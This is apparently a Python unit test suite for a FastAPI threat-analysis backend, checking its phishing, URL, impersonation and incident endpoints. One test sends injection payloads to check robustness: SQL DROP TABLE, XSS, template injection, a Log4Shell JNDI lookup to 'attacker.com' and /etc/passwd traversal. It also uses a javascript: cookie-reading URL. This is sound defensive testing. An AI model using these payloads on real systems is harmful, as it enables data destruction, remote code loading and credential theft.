"""
CYBERGUARD Full System Security Hardening, Edge-Case, and Robustness Test Suite (Day 8)

Tests:
1. Verification of all API endpoints (GET /, POST /analyze/*, GET /incidents, PATCH /incidents)
2. Input sanitization, empty payload resilience, null handling
3. Extreme input bounds (very long inputs, unicode, special chars)
4. Malformed URL parsing safety (protocol injection, script schemes, raw userinfo)
5. 404, 422, and error boundary responses
6. CORS header validation
7. Thread-safe incident store integrity under high volume
"""

import unittest
from fastapi.testclient import TestClient

from backend.main import app
from backend.engines.incident_manager import incident_manager
from backend.models.incident import IncidentStatus


class TestFullSystemHardeningAndRobustness(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.client = TestClient(app)

    def setUp(self):
        incident_manager.reset_store(seed=True)

    # -------------------------------------------------------------
    # 1. Endpoint Verification
    # -------------------------------------------------------------
    def test_01_root_healthcheck_endpoint(self):
        """Verify GET / returns operational status and timestamp."""
        resp = self.client.get("/")
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertEqual(data["message"], "CYBERGUARD Backend Running")
        self.assertEqual(data["version"], "1.0.0")
        self.assertIn("timestamp", data)

    def test_02_phishing_analysis_endpoint_valid_and_empty(self):
        """Verify POST /analyze/phishing handles both valid and empty payloads."""
        # Empty payload
        resp_empty = self.client.post("/analyze/phishing", json={})
        self.assertEqual(resp_empty.status_code, 200)
        data_empty = resp_empty.json()
        self.assertEqual(data_empty["threat_type"], "Phishing")
        self.assertEqual(data_empty["risk_score"], 0)
        self.assertEqual(data_empty["severity"], "SAFE")

        # Full payload
        resp_full = self.client.post("/analyze/phishing", json={
            "message_text": "URGENT: Your account access has been restricted. Confirm credentials.",
            "url": "http://paypa1-security-update.com/login",
            "sender": "alerts@paypal-security.net"
        })
        self.assertEqual(resp_full.status_code, 200)
        data_full = resp_full.json()
        self.assertGreaterEqual(data_full["risk_score"], 60)
        self.assertIn(data_full["severity"], ["HIGH", "CRITICAL"])
        self.assertTrue(len(data_full["evidence"]) > 0)
        self.assertTrue(len(data_full["recommended_actions"]) > 0)

    def test_03_url_analysis_endpoint_valid_and_malformed(self):
        """Verify POST /analyze/url handles safe, malicious, and malformed URLs."""
        # Safe URL
        resp_safe = self.client.post("/analyze/url", json={"url": "https://www.google.com"})
        self.assertEqual(resp_safe.status_code, 200)
        self.assertEqual(resp_safe.json()["risk_level"], "SAFE")

        # Dangerous script scheme
        resp_script = self.client.post("/analyze/url", json={"url": "javascript:alert(document.cookie)"})
        self.assertEqual(resp_script.status_code, 200)
        self.assertGreater(resp_script.json()["risk_score"], 0)
        self.assertTrue(any("Scheme" in item["indicator"] for item in resp_script.json()["evidence"]))

        # Raw IP host
        resp_ip = self.client.post("/analyze/url", json={"url": "http://192.168.1.1/admin@portal.com/login"})
        self.assertEqual(resp_ip.status_code, 200)
        self.assertGreaterEqual(resp_ip.json()["risk_score"], 50)

    def test_04_impersonation_analysis_endpoint(self):
        """Verify POST /analyze/impersonation attributes identity and detects mismatch."""
        resp = self.client.post("/analyze/impersonation", json={
            "claimed_identity": "Chief Financial Officer",
            "sender": "cfo@external-unrelated-domain.xyz",
            "message_text": "Please initiate an urgent wire transfer to the overseas account.",
            "url": "http://wire-transfer-portal.xyz"
        })
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertEqual(data["threat_type"], "Digital Impersonation")
        self.assertEqual(data["claimed_identity"], "Chief Financial Officer")
        self.assertGreaterEqual(data["risk_score"], 60)

    def test_05_account_security_analysis_endpoint(self):
        """Verify POST /analyze/account-security evaluates telemetry and flags brute-force."""
        resp = self.client.post("/analyze/account-security", json={
            "username": "sysadmin@corp.internal",
            "login_location": "Anonymized Tor Exit Node",
            "device_info": "python-requests bot client",
            "failed_login_count": 18,
            "event_description": "Repeated authentication failures on SSH/Web portal."
        })
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertEqual(data["threat_type"], "Account Takeover & Authentication Anomaly")
        self.assertEqual(data["username"], "sysadmin@corp.internal")
        self.assertGreaterEqual(data["risk_score"], 40)

    def test_06_login_test_endpoint(self):
        """Verify POST /analyze/login diagnostic endpoint."""
        resp = self.client.post("/analyze/login", json={"username": "testuser", "ip_address": "127.0.0.1"})
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp.json()["status"], "success")

    def test_07_incident_retrieval_and_filtering(self):
        """Verify GET /incidents handles multi-parameter filtering, sorting, and search."""
        # Query all
        resp_all = self.client.get("/incidents")
        self.assertEqual(resp_all.status_code, 200)
        d_all = resp_all.json()
        self.assertGreaterEqual(d_all["total"], 1)

        # Filter by threat_type
        resp_phish = self.client.get("/incidents?threat_type=Phishing")
        self.assertEqual(resp_phish.status_code, 200)
        for inc in resp_phish.json()["incidents"]:
            self.assertEqual(inc["threat_type"], "Phishing")

        # Sort by risk_score desc
        resp_sort = self.client.get("/incidents?sort_by=risk_score&order=desc")
        self.assertEqual(resp_sort.status_code, 200)
        scores = [i["risk_score"] for i in resp_sort.json()["incidents"]]
        self.assertEqual(scores, sorted(scores, reverse=True))

    def test_08_incident_status_update_and_404_handling(self):
        """Verify PATCH /incidents/{incident_id}/status and 404 response on missing item."""
        incidents = self.client.get("/incidents").json()["incidents"]
        self.assertTrue(len(incidents) > 0)
        first_id = incidents[0]["incident_id"]

        # Valid PATCH
        patch_res = self.client.patch(f"/incidents/{first_id}/status", json={"status": "RESOLVED"})
        self.assertEqual(patch_res.status_code, 200)
        self.assertEqual(patch_res.json()["status"], "RESOLVED")

        # 404 on non-existent ID
        missing_res = self.client.get("/incidents/INC-NONEXISTENT-9999")
        self.assertEqual(missing_res.status_code, 404)

        # 422 on invalid status
        bad_status_res = self.client.patch(f"/incidents/{first_id}/status", json={"status": "INVALID_STATE"})
        self.assertEqual(bad_status_res.status_code, 422)

    # -------------------------------------------------------------
    # 2. Extreme Input Bounds & Security Hardening
    # -------------------------------------------------------------
    def test_09_extremely_long_input_handling(self):
        """Verify system handles very large input text without buffer overflow or denial of service."""
        huge_text = "URGENT NOTICE! " * 500  # ~7500 characters
        resp = self.client.post("/analyze/phishing", json={"message_text": huge_text})
        self.assertEqual(resp.status_code, 200)
        self.assertGreater(resp.json()["risk_score"], 0)

    def test_10_unicode_and_special_character_resilience(self):
        """Verify system safely handles emojis, zero-width chars, and non-ASCII characters."""
        unicode_payload = {
            "message_text": "🚨 URGENT: ⚠️ Confirm password 🔑 for аpple.com (Cyrillic a) \u200B\u200D",
            "url": "http://аpple.com/login",
            "sender": "security@аpple.com"
        }
        resp = self.client.post("/analyze/phishing", json=unicode_payload)
        self.assertEqual(resp.status_code, 200)
        self.assertIsInstance(resp.json()["risk_score"], int)

    def test_11_sql_and_script_injection_payload_safety(self):
        """Verify injection strings in search query or detector inputs do not cause exceptions."""
        injection_queries = [
            "'; DROP TABLE incidents; --",
            "<script>alert('XSS')</script>",
            "{{ 7 * 7 }}",
            "${jndi:ldap://attacker.com/a}",
            "../../../../etc/passwd"
        ]
        for query in injection_queries:
            resp = self.client.get(f"/incidents?search={query}")
            self.assertEqual(resp.status_code, 200)
            self.assertIsInstance(resp.json()["incidents"], list)


if __name__ == "__main__":
    unittest.main()
